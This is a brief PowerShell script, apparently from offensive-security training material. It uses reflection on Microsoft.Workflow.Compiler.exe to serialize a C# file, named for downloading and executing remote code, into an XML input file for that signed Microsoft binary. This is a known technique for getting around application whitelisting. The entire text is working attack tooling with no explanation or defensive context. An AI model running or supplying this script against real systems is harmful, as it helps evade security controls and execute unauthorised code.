$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper',[Reflection.BindingFlags] 'NonPublic, Static')
Add-Type -Path "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll"
$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
$compilerparam.LibraryPaths.Add("C:\Windows\Microsoft.NET\Framework64\v4.0.30319")
$compilerparam.ReferencedAssemblies.Add('System.Net.dll')
$compilerparam.ReferencedAssemblies.Add('System.Reflection.dll')
$compilerparam.GenerateInMemory = $True
$pathvar = "C:\Users\student\Desktop\workflow_compiler_dl_and_exec_remote_cs.cs"
$output = "C:\Users\Offsec\Desktop\workflow_compiler_dl_and_exec_remote_cs.xml"
$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
Move-Item $tmp $output